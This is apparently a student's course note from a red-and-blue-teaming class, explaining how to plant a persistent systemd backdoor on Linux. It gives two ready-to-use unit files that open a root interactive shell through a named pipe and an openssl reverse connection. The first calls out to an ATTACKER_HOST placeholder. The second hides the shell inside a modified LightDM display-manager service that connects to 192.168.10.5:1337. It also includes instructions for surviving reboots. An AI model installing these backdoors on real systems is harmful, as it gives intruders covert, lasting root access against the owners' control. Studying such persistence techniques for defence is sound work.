---
tags:
  - 🔧
aliases: 
templateVersion: 0.4
Created: 2024-10-14
course: Red and Blue Teaming - 141254
lecturer:
  - Martin Grothe
---

___
> [!info] What this does
>  

## Systemd Backdoor

Create Systemd config-file in either /etc/systemd/system/ (global) or /lib/systemd/system (local) and fill it:
- **After** defines services, that should be started before ours. In this case, we need the ssh process and all network services (it’s a group, because it ends with .target) to be started before ours
- **ExecStartPre** will be executed before the service is started. In this case, it creates a new pipe that our payload uses
- **ExecStart** is the service that is about to get startet. We create an interactive shell which executes commands from this new pipe. We also pipe the output of the shell into openssl, which sends it to us. The output from openssl, which are the commands that we send to it, are written into the pipe. This closes the circle, as bash wil read the commands from this pipe and give it’s output to openssl
- **ExecStopPost** will be executed after the service is stopped. In this case, it removes the pipe we created.


```bash
# /lib/systemd/system/ssh-backdoor.service
# sudo systemctl enable ssh-backdoor.service
[Unit]
Description=SSH Backdoor for remote access to systems without a static IP via external server
After=network.target ssh.service

[Service]
Type=simple
User=root
ExecStartPre=/bin/bash -c 'mkfifo -m 700 /tmp/named_pipe;'
ExecStart=/usr/bin/env bash -i < /tmp/named_pipe | openssl s_client -quiet --connect ATTACKER_HOST:ATTACKER_PORT > /tmp/named_pipe;
ExecStopPost=/bin/bash -c 'rm /tmp/named_pipe'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```
[Basis](https://gist.github.com/itay-grudev/c7032efcc1850280fab0bc3a2ea0a214) 

For persistence after restart
```bash
[Unit]
After=ntwork-online.target
Wants=network-online.target
```
and `systemctl enable filename_of_our_config.service`

# Alternative with LDM
```Bash
[Unit]
Description=Light Display Manager
Documentation=man:lightdm(1)
After=systemd-user-sessions.service

# replaces plymouth-quit since lightdm quits plymouth on its own
Conflicts=plymouth-quit.service
After=plymouth-quit.service

# lightdm takes responsibility for stopping plymouth, so if it fails
# for any reason, make sure plymouth still stops
OnFailure=plymouth-quit.service

[Service]
ExecStart=/usr/sbin/lightdm
ExecStartPre=-/usr/bin/bash -c 'mkfifo /tmp/named_pipe'
ExecStartPost=/usr/bin/bash -c '/usr/bin/bash -i < /tmp/named_pipe | openssl s_client -quiet --connect 192.168.10.5:1337 > /tmp/named_pipe'
Restart=always
BusName=org.freedesktop.DisplayManager

[Install]
Alias=display-manager.service
```

## Source


---
```dataview
table without id
    file.link as "Related Topics"
FROM "02 - Secondary Categories"
WHERE contains(file.outlinks, this.file.link) OR contains(file.inlinks, this.file.link) AND file.name != this.file.name
SORT file.name
SORT !(contains(primaryTopic, this.file.link))
```
```dataview
table without id
    file.link as "Related Content", primaryTopic as "Primary Topic"
FROM "03 - Content"
WHERE contains(file.outlinks, this.file.link)
SORT file.name
SORT !(contains(primaryTopic, this.file.link))
```
___



